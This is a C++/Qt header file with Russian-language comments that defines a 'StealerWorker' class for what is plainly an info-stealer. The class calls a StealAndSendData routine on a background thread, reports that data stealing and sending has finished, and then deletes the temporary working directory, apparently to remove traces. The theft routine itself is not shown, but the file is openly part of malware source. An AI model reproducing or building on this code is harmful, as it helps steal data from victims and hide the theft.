#ifndef STEALERWORKER_H
#define STEALERWORKER_H

#include <QObject>
#include <QDebug>         // Для qDebug и qWarning
#include <exception>      // Для std::exception
#include <filesystem>     // Для std::filesystem
#include "mainwindow.h"   // Для MainWindow

class StealerWorker : public QObject {
    Q_OBJECT
public:
    explicit StealerWorker(MainWindow* window, const QString& tempDir, QObject* parent = nullptr)
        : QObject(parent), window(window), tempDir(tempDir) {
        if (!window) {
            qWarning("StealerWorker: MainWindow pointer is null");
        }
        if (tempDir.isEmpty()) {
            qWarning("StealerWorker: Temp directory is empty");
        }
    }

public slots:
    void process() {
        if (!window || tempDir.isEmpty()) {
            qWarning("StealerWorker: Cannot process, invalid parameters");
            emit finished();
            return;
        }

        try {
            std::string processResult = window->StealAndSendData(tempDir.toStdString());
            qDebug() << "StealerWorker: Data stealing and sending completed successfully";
            emit result(QString::fromStdString(processResult));
        } catch (const std::exception& e) {
            qWarning() << "StealerWorker: Exception during data stealing:" << e.what();
            emit result("Ошибка: " + QString::fromStdString(e.what()));
        }

        // Очистка временной директории
        std::error_code ec;
        std::filesystem::remove_all(tempDir.toStdString(), ec);
        if (ec) {
            qWarning() << "StealerWorker: Failed to remove temp directory" << tempDir 
                       << ":" << ec.message().c_str();
            emit result("Ошибка удаления временной директории: " + QString::fromStdString(ec.message()));
        } else {
            qDebug() << "StealerWorker: Temp directory" << tempDir << "removed";
            emit result("Временная директория удалена: " + tempDir);
        }

        emit finished();
    }

signals:
    void finished();
    void result(const QString& message);

private:
    MainWindow* window;
    QString tempDir;
};

#endif // STEALERWORKER_H